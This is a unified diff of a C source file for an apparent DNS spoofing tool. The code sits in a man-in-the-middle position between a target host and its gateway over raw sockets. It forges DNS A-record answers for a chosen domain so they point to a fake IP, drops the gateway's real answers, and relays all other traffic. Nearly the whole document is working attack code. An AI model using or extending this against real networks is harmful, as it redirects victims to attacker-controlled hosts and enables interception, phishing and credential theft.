@@ -1,62 +1,153 @@
 #include "dnsspoof.h"
 #include "utils.h"
 
-void dns_pac_status(uint8_t* pac, char* qname, uint16_t qtype, uint16_t qclass){
+void* target_to_gateway(void* args){
+    int sock_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
+    if(sock_ip < 0){
+        fprintf(stderr, "Error in creating IP socket\n");
+        exit(0);
+    }
+    attacking_args_t *argument = (attacking_args_t*) args;
+    uint8_t* ip_pac = malloc(IP_PACKET_LEN);
+
+    memset(ip_pac, 0 , IP_PACKET_LEN);
+    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
+    struct iphdr *ip_hdr = (struct iphdr*) (ip_pac + sizeof(struct ether_header));
+    struct udphdr *udp_hdr = (struct udphdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr));
+    struct dnshdr* dns_hdr = (struct dnshdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) );
+    uint8_t* query_data = (uint8_t*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
+    
+    struct dnsquery dns_query;
+    uint8_t* qname_str = (uint8_t*) calloc(REQUEST_SIZE, sizeof(uint8_t));
+    
+    int byte_recv;
     int i;
-    uint8_t* dns_data = (uint8_t*) (pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
-    struct ether_header *eth_hdr = (struct ether_header*) pac;
-    struct iphdr *ip_hdr = (struct iphdr*) (pac + sizeof(struct ether_header));
-    struct udphdr *udp_hdr = (struct udphdr*) (pac + sizeof(struct ether_header) + sizeof(struct iphdr));
-    struct dnshdr* dns_hdr = (struct dnshdr*) (pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) );
-    struct dnsquery* dns_query = (struct dnsquery*) (pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
-    fprintf(stderr, "\n____________________________________\n");
-    fprintf(stderr, "ether_dhost: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x ", *eth_hdr->ether_dhost, *(eth_hdr->ether_dhost+1), *(eth_hdr->ether_dhost+2), *(eth_hdr->ether_dhost+3), *(eth_hdr->ether_dhost+4), *(eth_hdr->ether_dhost+5));
-    fprintf(stderr, "| ether_shost: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x ", *eth_hdr->ether_shost, *(eth_hdr->ether_shost+1), *(eth_hdr->ether_shost+2), *(eth_hdr->ether_shost+3), *(eth_hdr->ether_shost+4), *(eth_hdr->ether_shost+5));
-    fprintf(stderr, "| ether_type: 0x%.4x\n", ntohs(eth_hdr->ether_type));
+    while(1){
+        byte_recv = recvfrom(sock_ip, ip_pac, IP_PACKET_LEN, 0, NULL, NULL);
+        if(byte_recv>0){
+            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->saddr, argument->target_ip) && !compare_ip(ip_hdr->daddr, argument->my_ip)){
 
-    fprintf(stderr, "ver: %d | ihl: %d", ntohs(ip_hdr->version), ntohs(ip_hdr->ihl));
-    fprintf(stderr, " | tos: 0x%.2x", ip_hdr->tos);
-    fprintf(stderr, " | tot_len: 0x%.4x", ntohs(ip_hdr->tot_len));
-    fprintf(stderr, " | id: 0x%4x", ntohs(ip_hdr->id));
-    fprintf(stderr, " | frag_off: 0x%.4x", ntohs(ip_hdr->frag_off));
-    fprintf(stderr, " | ttl: 0x%2x", ip_hdr->ttl);
-    fprintf(stderr, " | protocol: 0x%.2x", ip_hdr->protocol);
-    fprintf(stderr, " | check: 0x%.4x", ntohs( ip_hdr->protocol));
-    fprintf(stderr, " | saddr: %d.%d.%d.%d", *ip_hdr->saddr, *(ip_hdr->saddr+1), *(ip_hdr->saddr+2), *(ip_hdr->saddr+3));
-    fprintf(stderr, " | daddr: %d.%d.%d.%d\n", *ip_hdr->daddr, *(ip_hdr->daddr+1), *(ip_hdr->daddr+2), *(ip_hdr->daddr+3));
+                if(ip_hdr->protocol == PROTOCOL_UDP && udp_hdr->uh_dport == ntohs(DNS_SERVICE_PORT)){
 
-    fprintf(stderr, "sport: 0x%.4x", ntohs(udp_hdr->uh_sport));
-    fprintf(stderr, " | dport: 0x%.4x", ntohs(udp_hdr->uh_dport));
-    fprintf(stderr, " | len: 0x%.4x", ntohs(udp_hdr->len));
-    fprintf(stderr, " | check: 0x%.4x\n", ntohs(udp_hdr->check));
+                    extract_dns_request(query_data, qname_str);
+                    
+                    
 
-    fprintf(stderr, "tid: 0x%.4x", ntohs(dns_hdr->tid));
-    fprintf(stderr, " | flags: 0x%.4x", ntohs(dns_hdr->flags));
-    fprintf(stderr, " | questions: %d", ntohs(dns_hdr->questitons));
-    fprintf(stderr, " | answer RRs: %d", dns_hdr->answer_rrs);
-    fprintf(stderr, " | authority RRs: %d", dns_hdr->auth_rrs);
-    fprintf(stderr, " | add RRs: %d\n", dns_hdr->add_rrs);
+                    for(i = 0; i < byte_recv - (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr)); i++){
+                        //fprintf(stderr, "%.2x ", *(query_data+i));
+                    }
+                    int qname_len = i-4;  // = total - 4bytes (class + type)
+                    uint8_t* qname = (uint8_t*) malloc(qname_len);
+                    memcpy(qname, query_data, qname_len);
+                    uint16_t* qtype = (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len);
+                    uint16_t* qclass = (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len + 2);
 
-    fprintf(stderr, "qname: %s", qname);
-    fprintf(stderr, " | type: 0x%.4x", qtype);
-    fprintf(stderr, " | class:0x %.4x\n", qclass);
-    fprintf(stderr, "____________________________________\n\n");
+                    dns_query.qname = qname;
+                    dns_query.qtype = ntohs(*qtype);
+                    dns_query.qclass = ntohs(*qclass);
 
+                   if(!strcmp(qname_str, argument->qname) && dns_query.qtype == TYPE_A && dns_query.qtype == CLASS_IN ){
+                        dns_pac_status(ip_pac, qname_str, dns_query.qtype, dns_query.qclass);
+
+                        int dns_res_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len + 4 + sizeof(struct dnsanswer);
+                        uint8_t* dns_res = construct_dns_response(argument->my_mac, argument->target_mac,
+                        ip_hdr->id, ip_hdr->protocol, ip_hdr->daddr, ip_hdr->saddr, 
+                        udp_hdr->uh_sport, dns_hdr->tid,
+                        query_data, qname_len+4,
+                        argument->ip_dns_fake);
+
+                           /*fprintf(stderr, "DNS response (%d bytes): ", dns_res_len);
+                            for(i = 0; i < dns_res_len; i++)
+                                fprintf(stderr, "%.2x ", *(dns_res+i));*/
+                        if(!sendto(sock_ip, dns_res, dns_res_len, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
+                            fprintf(stderr, "Error in forwading\n");
+                   }
+                    else if(!strcmp(qname_str, argument->qname) && (dns_query.qtype != TYPE_A || dns_query.qtype != CLASS_IN) ){
+                            fprintf(stderr, "[!] Droped a DNS query\n");
+                    }
+                    else{
+                        modify_l2_hdr(ip_pac, argument->my_mac, argument->gateway_mac);
+                        if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
+                            fprintf(stderr, "Error in forwading\n");
+                    }
+
+                }else{
+                    modify_l2_hdr(ip_pac, argument->my_mac, argument->gateway_mac);
+                    if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
+                        fprintf(stderr, "Error in forwading\n");
+                }
+                
+            }
+        }
+    }
+}
+void* gateway_to_target(void* args){
+    int sock_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
+    if(sock_ip < 0){
+        fprintf(stderr, "Error in creating IP socket\n");
+        exit(0);
+    }
+    attacking_args_t *argument = (attacking_args_t*) args;
+    uint8_t* ip_pac = malloc(IP_PACKET_LEN);
+
+    memset(ip_pac, 0 , IP_PACKET_LEN);
+    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
+    struct iphdr *ip_hdr = (struct iphdr*) (ip_pac + sizeof(struct ether_header));
+    struct udphdr *udp_hdr = (struct udphdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr));
+    struct dnshdr* dns_hdr = (struct dnshdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) );
+    uint8_t* query_data = (uint8_t*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
+    struct dnsquery dns_query;
+
+    int byte_recv;
+    int i;
+
+
+    while(1){
+        byte_recv = recvfrom(sock_ip, ip_pac, IP_PACKET_LEN, 0, NULL, NULL);
+        if(byte_recv>0){
+            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->daddr, argument->target_ip)){
+
+                if(ip_hdr->protocol == PROTOCOL_UDP && udp_hdr->uh_sport == ntohs(DNS_SERVICE_PORT)){
+
+                    for(i = 0; i < byte_recv - (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr)); i++){
+                        //fprintf(stderr, "%.2x ", *(query_data+i));
+                    }
+                    int qname_len = i-4;  // = total - 4bytes (class + type)
+                    uint8_t* qname = (uint8_t*) malloc(qname_len);
+                    memcpy(qname, query_data, qname_len);
+                    uint16_t* qtype = (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len);
+                    uint16_t* qclass = (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len + 2);
+
+                    dns_query.qname = qname;
+                    dns_query.qtype = ntohs(*qtype);
+                    dns_query.qclass = ntohs(*qclass);
+
+                    uint8_t* qname_str = (uint8_t*) calloc(REQUEST_SIZE, sizeof(uint8_t));
+                    extract_dns_request(query_data, qname_str);
+                   if(!strcmp(qname_str, argument->qname)){
+                       fprintf(stderr, "[!] Received a DNS response from Gateway, Drop!\n");
+                   }
+                   else{
+                        modify_l2_hdr(ip_pac, argument->my_mac, argument->target_mac);
+                        if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
+                            fprintf(stderr, "Error in forwading\n");
+                   }
+
+
+                }else{
+                modify_l2_hdr(ip_pac, argument->my_mac, argument->target_mac);
+                if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
+                    fprintf(stderr, "Error in forwading\n");
+                //else
+                    //fprintf(stderr, "Gateway -> Target\n");
+                }
+                
+            }
+        }
+    }
 }
 
-
-
-//! \brief
-//!     Calculate the UDP checksum (calculated with the whole
-//!     packet).
-//! \param buff The UDP packet.
-//! \param len The UDP packet length.
-//! \param src_addr The IP source address (in network format).
-//! \param dest_addr The IP destination address (in network format).
-//! \return The result of the checksum.
-
-uint16_t udp_checksum( uint16_t* buf, size_t len, uint16_t* saddr, uint16_t* daddr)
-{
+uint16_t udp_checksum( uint16_t* buf, size_t len, uint16_t* saddr, uint16_t* daddr){
         //fprintf(stderr," Pseudo header: saddr: %x %x | dst: %x %x | len: %.4x (%d) | protocol: 0x0011 (17)\n", htons(*saddr), htons(*(saddr+1)), htons(*daddr), htons(*(daddr+1)), len, len );
         uint32_t sum=0;
         size_t length = len;
@@ -231,149 +322,4 @@ uint8_t* construct_dns_response(uint8_t* ether_shost, uint8_t* ether_dhost, //l2
     udp_hdr_t->uh_sum = udp_checksum( udp_pac, ntohs(udp_hdr->uh_ulen), (uint16_t*) (ip_hdr->saddr), (uint16_t*) (ip_hdr->daddr));
  
     return dns_pac;
-}
-void* target_to_gateway(void* args){
-    int sock_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
-    if(sock_ip < 0){
-        fprintf(stderr, "Error in creating IP socket\n");
-        exit(0);
-    }
-    attacking_args_t *argument = (attacking_args_t*) args;
-    uint8_t* ip_pac = malloc(IP_PACKET_LEN);
-
-    memset(ip_pac, 0 , IP_PACKET_LEN);
-    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
-    struct iphdr *ip_hdr = (struct iphdr*) (ip_pac + sizeof(struct ether_header));
-    struct udphdr *udp_hdr = (struct udphdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr));
-    struct dnshdr* dns_hdr = (struct dnshdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) );
-    uint8_t* query_data = (uint8_t*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
-    
-    struct dnsquery dns_query;
-    uint8_t* qname_str = (uint8_t*) calloc(REQUEST_SIZE, sizeof(uint8_t));
-    
-    int byte_recv;
-    int i;
-    while(1){
-        byte_recv = recvfrom(sock_ip, ip_pac, IP_PACKET_LEN, 0, NULL, NULL);
-        if(byte_recv>0){
-            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->saddr, argument->target_ip) && !compare_ip(ip_hdr->daddr, argument->my_ip)){
-
-                if(ip_hdr->protocol == PROTOCOL_UDP && udp_hdr->uh_dport == ntohs(DNS_SERVICE_PORT)){
-
-                    extract_dns_request(query_data, qname_str);
-                    
-                    
-
-                    for(i = 0; i < byte_recv - (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr)); i++){
-                        //fprintf(stderr, "%.2x ", *(query_data+i));
-                    }
-                    int qname_len = i-4;  // = total - 4bytes (class + type)
-                    uint8_t* qname = (uint8_t*) malloc(qname_len);
-                    memcpy(qname, query_data, qname_len);
-                    uint16_t* qtype = (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len);
-                    uint16_t* qclass = (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len + 2);
-
-                    dns_query.qname = qname;
-                    dns_query.qtype = ntohs(*qtype);
-                    dns_query.qclass = ntohs(*qclass);
-
-                   if(!strcmp(qname_str, argument->qname) && dns_query.qtype == TYPE_A && dns_query.qtype == CLASS_IN ){
-                        dns_pac_status(ip_pac, qname_str, dns_query.qtype, dns_query.qclass);
-
-                        int dns_res_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len + 4 + sizeof(struct dnsanswer);
-                        uint8_t* dns_res = construct_dns_response(argument->my_mac, argument->target_mac,
-                        ip_hdr->id, ip_hdr->protocol, ip_hdr->daddr, ip_hdr->saddr, 
-                        udp_hdr->uh_sport, dns_hdr->tid,
-                        query_data, qname_len+4,
-                        argument->ip_dns_fake);
-
-                           /*fprintf(stderr, "DNS response (%d bytes): ", dns_res_len);
-                            for(i = 0; i < dns_res_len; i++)
-                                fprintf(stderr, "%.2x ", *(dns_res+i));*/
-                        if(!sendto(sock_ip, dns_res, dns_res_len, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
-                            fprintf(stderr, "Error in forwading\n");
-                   }
-                    else if(!strcmp(qname_str, argument->qname) && (dns_query.qtype != TYPE_A || dns_query.qtype != CLASS_IN) ){
-                            fprintf(stderr, "[!] Droped a DNS query\n");
-                    }
-                    else{
-                        modify_l2_hdr(ip_pac, argument->my_mac, argument->gateway_mac);
-                        if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
-                            fprintf(stderr, "Error in forwading\n");
-                    }
-
-                }else{
-                    modify_l2_hdr(ip_pac, argument->my_mac, argument->gateway_mac);
-                    if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
-                        fprintf(stderr, "Error in forwading\n");
-                }
-                
-            }
-        }
-    }
-}
-void* gateway_to_target(void* args){
-    int sock_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
-    if(sock_ip < 0){
-        fprintf(stderr, "Error in creating IP socket\n");
-        exit(0);
-    }
-    attacking_args_t *argument = (attacking_args_t*) args;
-    uint8_t* ip_pac = malloc(IP_PACKET_LEN);
-
-    memset(ip_pac, 0 , IP_PACKET_LEN);
-    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
-    struct iphdr *ip_hdr = (struct iphdr*) (ip_pac + sizeof(struct ether_header));
-    struct udphdr *udp_hdr = (struct udphdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr));
-    struct dnshdr* dns_hdr = (struct dnshdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) );
-    uint8_t* query_data = (uint8_t*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
-    struct dnsquery dns_query;
-
-    int byte_recv;
-    int i;
-
-
-    while(1){
-        byte_recv = recvfrom(sock_ip, ip_pac, IP_PACKET_LEN, 0, NULL, NULL);
-        if(byte_recv>0){
-            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->daddr, argument->target_ip)){
-
-                if(ip_hdr->protocol == PROTOCOL_UDP && udp_hdr->uh_sport == ntohs(DNS_SERVICE_PORT)){
-
-                    for(i = 0; i < byte_recv - (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr)); i++){
-                        //fprintf(stderr, "%.2x ", *(query_data+i));
-                    }
-                    int qname_len = i-4;  // = total - 4bytes (class + type)
-                    uint8_t* qname = (uint8_t*) malloc(qname_len);
-                    memcpy(qname, query_data, qname_len);
-                    uint16_t* qtype = (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len);
-                    uint16_t* qclass = (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len + 2);
-
-                    dns_query.qname = qname;
-                    dns_query.qtype = ntohs(*qtype);
-                    dns_query.qclass = ntohs(*qclass);
-
-                    uint8_t* qname_str = (uint8_t*) calloc(REQUEST_SIZE, sizeof(uint8_t));
-                    extract_dns_request(query_data, qname_str);
-                   if(!strcmp(qname_str, argument->qname)){
-                       fprintf(stderr, "[!] Received a DNS response from Gateway, Drop!\n");
-                   }
-                   else{
-                        modify_l2_hdr(ip_pac, argument->my_mac, argument->target_mac);
-                        if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
-                            fprintf(stderr, "Error in forwading\n");
-                   }
-
-
-                }else{
-                modify_l2_hdr(ip_pac, argument->my_mac, argument->target_mac);
-                if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
-                    fprintf(stderr, "Error in forwading\n");
-                //else
-                    //fprintf(stderr, "Gateway -> Target\n");
-                }
-                
-            }
-        }
-    }
 }
